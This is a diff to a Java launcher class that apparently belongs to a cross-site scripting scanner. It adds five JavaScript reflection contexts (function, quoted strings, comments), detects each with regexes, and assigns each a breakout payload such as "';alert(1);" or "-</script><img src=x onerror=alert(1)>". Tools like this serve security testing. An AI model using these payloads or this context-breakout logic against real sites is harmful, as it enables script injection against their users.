@@ -24,7 +24,7 @@ public class Launcher {
 	static String payload = "";
 
 	static enum CONTEXT {
-		SIMPLE_HTML, HTML_ATTRIBUTE_NAME, HTML_ATTRIBUTE_VALUE, HTML_COMMENTS, JAVASCRIPT_CONTEXT, CSS_CONTEXT
+		SIMPLE_HTML, HTML_ATTRIBUTE_NAME, HTML_ATTRIBUTE_VALUE, HTML_COMMENTS, JS_FUNC, JS_SINGLE_QUOTES, JS_DOUBLE_QUOTES, JS_SINGLE_COMMENT, JS_MULTI_COMMENT, CSS_CONTEXT
 	};
 
 	static CONTEXT context = null;
@@ -55,38 +55,42 @@ public class Launcher {
 							String doubleQuotes = "\"" + input + "\"";
 							String singleLineComment = "//.*" + input + ".*\r\n";
 							String doubleLineComment = "\\/\\*.*" + input + ".*\\*\\/";
-							
+
 							Pattern pFunc = Pattern.compile(func);
 							Pattern pSingleQuotes = Pattern.compile(singleQuotes);
 							Pattern pDoubleQuotes = Pattern.compile(doubleQuotes);
 							Pattern pSingleLineComment = Pattern.compile(singleLineComment);
 							Pattern pDoubleLineComment = Pattern.compile(doubleLineComment, Pattern.DOTALL);
-							
+
 							Matcher m = pFunc.matcher(data);
-							if(m.find()){
+							if (m.find()) {
 								System.out.println("func pattern");
+								context = CONTEXT.JS_FUNC;
 							}
 							m = pSingleQuotes.matcher(data);
-							if(m.find()){
+							if (m.find()) {
 								System.out.println("single quotes pattern");
+								context = CONTEXT.JS_SINGLE_QUOTES;
 							}
 							m = pDoubleQuotes.matcher(data);
-							
-							if(m.find()){
-								System.out.println("double quotes pattern");
-							}
-							 m = pSingleLineComment.matcher(data);
-							if(m.find()){
-								System.out.println("single line comment pattern");
-							}
-							 m = pDoubleLineComment.matcher(data);
-							
-							if(m.find()){
-								System.out.println("multi line comment pattern");
-							}
-							
 
-							context = CONTEXT.JAVASCRIPT_CONTEXT;
+							if (m.find()) {
+								System.out.println("double quotes pattern");
+								context = CONTEXT.JS_DOUBLE_QUOTES;
+							}
+							m = pSingleLineComment.matcher(data);
+							if (m.find()) {
+								System.out.println("single line comment pattern");
+								context = CONTEXT.JS_SINGLE_COMMENT;
+							}
+							m = pDoubleLineComment.matcher(data);
+
+							if (m.find()) {
+								System.out.println("multi line comment pattern");
+								context = CONTEXT.JS_MULTI_COMMENT;
+							}
+
+							;
 						}
 					}
 					if (node instanceof Element) {
@@ -132,8 +136,20 @@ public class Launcher {
 				break;
 			case HTML_ATTRIBUTE_VALUE:
 				break;
-			case JAVASCRIPT_CONTEXT:
+			case JS_FUNC:
 				payload = "-</script><img src=x onerror=alert(1)>";
+				break;
+			case JS_SINGLE_QUOTES:
+				payload = "';alert(1);";
+				break;
+			case JS_DOUBLE_QUOTES:
+				payload = "\";alert(2);";
+				break;
+			case JS_SINGLE_COMMENT:
+				payload = "\r\nalert(3);";
+				break;
+			case JS_MULTI_COMMENT:
+				payload = "*/alert(1);";
 				break;
 			case CSS_CONTEXT:
 				break;
